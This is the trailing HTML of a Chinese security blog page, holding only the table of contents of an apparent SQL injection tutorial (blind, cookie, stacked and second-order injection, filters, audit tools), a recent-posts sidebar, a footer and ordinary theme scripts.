class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.3.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0-2"><span class="toc-number">3.3.3.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">延时函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#if-exp1-exp2-exp3"><span class="toc-number">3.3.3.2.</span> <span class="toc-text">if(exp1,exp2,exp3)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sleep"><span class="toc-number">3.3.3.2.1.</span> <span class="toc-text">sleep()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#benchmark%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.3.3.</span> <span class="toc-text">benchmark函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ascii%E7%A0%81%E5%AF%B9%E7%85%A7%E8%A1%A8"><span class="toc-number">3.3.4.</span> <span class="toc-text">ascii码对照表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">3.3.5.</span> <span class="toc-text">实现过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">判断注入点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD"><span class="toc-number">3.3.6.</span> <span class="toc-text">逻辑判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ctfhub%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.7.</span> <span class="toc-text">例题:ctfhub时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">堆叠注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">3.5.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Asqli-labs38"><span class="toc-number">3.5.2.</span> <span class="toc-text">例题：sqli-labs38</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E6%98%AFinformation-schema"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">注意是information_schema</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.6.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A-%E7%BB%95%E8%BF%87%E8%BD%AC%E4%B9%89%E6%B3%A8%E5%85%A5-%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7"><span class="toc-number">3.6.2.</span> <span class="toc-text">原理： 绕过转义注入 魔术引号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%EF%BC%9A"><span class="toc-number">3.6.2.1.</span> <span class="toc-text">实例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.6.3.</span> <span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">3.6.4.</span> <span class="toc-text">关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-number">3.6.5.</span> <span class="toc-text">二次注入功能点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">3.7.</span> <span class="toc-text">过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0addslashes"><span class="toc-number">3.7.1.</span> <span class="toc-text">过滤函数addslashes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">3.8.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#seay"><span class="toc-number">3.8.1.</span> <span class="toc-text">seay</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">3.8.1.1.</span> <span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">3.8.1.2.</span> <span class="toc-text">判断过滤机制</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Zeek%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="五元组流的流级别特征提取、报文级时间序列特征提取">五元组流的流级别特征提取、报文级时间序列特征提取</a><time datetime="2024-08-02T03:17:48.294Z" title="发表于 2024-08-02 11:17:48">2024-08-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8V8/" title="Suricata通过共享内存获取流量+pwn-浏览器内核V8">Suricata通过共享内存获取流量+pwn-浏览器内核V8</a><time datetime="2024-07-13T12:56:47.918Z" title="发表于 2024-07-13 20:56:47">2024-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Docker+K8s/" title="云原生实战-Docker+K8s">云原生实战-Docker+K8s</a><time datetime="2024-04-10T12:40:41.235Z" title="发表于 2024-04-10 20:40:41">2024-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/" title="计算机网络复习">计算机网络复习</a><time datetime="2024-04-01T12:39:28.311Z" title="发表于 2024-04-01 20:39:28">2024-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Metasploit%E5%AE%9E%E6%88%98/" title="Metasploit实战">Metasploit实战</a><time datetime="2024-03-19T08:19:14.901Z" title="发表于 2024-03-19 16:19:14">2024-03-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">成功的秘诀在于兴趣</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.0.0"></script><script src="/js/main.js?v=5.0.0"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>